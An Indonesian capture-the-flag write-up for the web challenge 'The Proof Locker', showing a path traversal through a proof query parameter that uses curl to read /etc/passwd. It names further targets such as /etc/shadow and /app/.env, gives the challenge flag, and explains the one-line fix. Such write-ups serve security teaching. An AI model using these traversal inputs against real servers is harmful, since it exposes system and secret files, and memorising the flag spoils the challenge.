---
ctf: "RIFFHACK 2026"
kategori: "Web"
challenge: "The Proof Locker"
flag: "bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}"
teknik: "Path traversal di /api/reviews/proof?proof=...; flag disamarkan di field GECOS user sintetis di /etc/passwd"
---

# The Proof Locker — RIFFHACK 2026 (Web)

## Deskripsi Singkat

`GET /api/reviews/proof?proof=<path>` menggabungkan query parameter ke path filesystem. Urutan `../` lolos dari proof root. Pilihan desain menariknya: traversal-nya hanya bekerja reliable terhadap `/etc/passwd`, dan flag-nya disamarkan di dalam file itu sebagai field GECOS milik user sintetis.

## Analisis

```bash
$ curl -s -b "$COOKIE" \
  'http://<host>/api/reviews/proof?proof=../../../../etc/passwd' | head
root:x:0:0:root:/root:/bin/bash
```

Setiap input traversal non-kosong runtuh jadi `/etc/passwd`. Setiap "langkah berikutnya" yang dicoba setelah `/etc/passwd` (`/etc/shadow`, `/proc/self/environ`, `/app/.env`, dll.) ditolak oleh handler — terlihat seperti LFI buntu.

## Eksploitasi / Solusi

Flag-nya disamarkan di dalam `/etc/passwd` sendiri:

```bash
$ curl -s -b "$COOKIE" \
  'http://<host>/api/reviews/proof?proof=../../../../etc/passwd' | tail -1
opsflag:x:1337:1337:bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}:/nonexistent:/usr/sbin/nologin
```

User `opsflag` sintetis (UID/GID 1337, home `/nonexistent`, shell `/usr/sbin/nologin`) dengan field GECOS membawa flag. `head /etc/passwd` melewatkannya; `grep bitflag` langsung menemukannya.

## Catatan / Insight

Bug handler-nya tekstual-buku: `path.join(proofRoot, req.query.proof)` meruntuhkan segmen `..` tanpa pengecekan `startsWith(proofRoot)` sesudahnya. Mitigasinya satu baris: normalisasi, lalu cek path hasil resolve tetap di dalam root. Pengalih perhatian lewat kebanalan lebih menarik: pembuat challenge menyamarkan flag di dalam file yang pertama kali di-dump setiap solver, lalu membuat handler menolak setiap "langkah berikutnya" supaya solver yang tidak meng-grep file yang membosankan itu menyerah.

## Flag

```
bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}
```
